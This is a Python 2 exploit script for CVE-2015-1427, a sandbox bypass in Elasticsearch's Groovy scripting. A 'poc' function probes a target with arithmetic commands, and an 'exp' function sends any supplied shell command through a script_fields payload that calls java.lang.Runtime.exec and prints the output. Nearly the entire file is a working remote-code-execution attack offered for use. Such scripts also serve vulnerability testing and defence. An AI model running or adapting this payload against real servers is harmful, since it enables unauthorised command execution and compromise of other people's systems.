#!/usr/bin/env python
#-*- coding:utf-8 -*-
# author = S4kur4
_type = 'RCE'
"""
Elasticsearch groovy sandbox bypass RCE PoC and Exp (CVE-2015-1427)
CVE details:http://www.cvedetails.com/cve/CVE-2015-1427
"""

import requests
import json
import random

header = {
    "User-Agent" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:46.0) Gecko/20100101 Firefox/46.0",
    "Connection" : "keep-alive",
    "Accept" : "*/*",
    "Accept-Encoding" : "deflate",
    "Accept-Language" : "zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4"
    }

def poc(url):
    if '://' not in url:
        url = 'http://' + url
    try:
        a = random.randint(10000000, 20000000)
        b = random.randint(10000000, 20000000)
        c = a + b
        win = 'set /a ' + str(a) + ' + ' + str(b)
        linux = 'expr ' + str(a) + ' + ' + str(b)

        data1 = """{"size":1, "script_fields": {"lupin":{"script": "java.lang.Math.class.forName(\\"java.lang.Runtime\\").getRuntime().exec(\\"%s\\").getText()"}}}""" % win
        data2 = """{"size":1, "script_fields": {"lupin":{"script": "java.lang.Math.class.forName(\\"java.lang.Runtime\\").getRuntime().exec(\\"%s\\").getText()"}}}""" % linux
        response1 = requests.get(url=url, headers=header, data=data1, timeout=5)
        response2 = requests.get(url=url, headers=header, data=data2, timeout=5)
        response1_json = json.loads(response1.text)
        response2_json = json.loads(response2.text)
        if response1_json['hits']['hits']:
            value1 = response1_json['hits']['hits'][0]['fields']['lupin'][0].strip()
            if value1 == str(c):
                return True
        if response2_json['hits']['hits']:
            value2 = response2_json['hits']['hits'][0]['fields']['lupin'][0].strip()
            if value2 == str(c):
                return True
        return False
    except Exception:
        pass

def exp(url, command):
    data = """{"size":1, "script_fields": {"lupin":{"script": "java.lang.Math.class.forName(\\"java.lang.Runtime\\").getRuntime().exec(\\"%s\\").getText()"}}}""" % command
    response = requests.get(url=url, headers=header, data=data, timeout=5)
    response_json = json.loads(response.text)
    print response_json['hits']['hits'][0]['fields']['lupin'][0].rstrip()

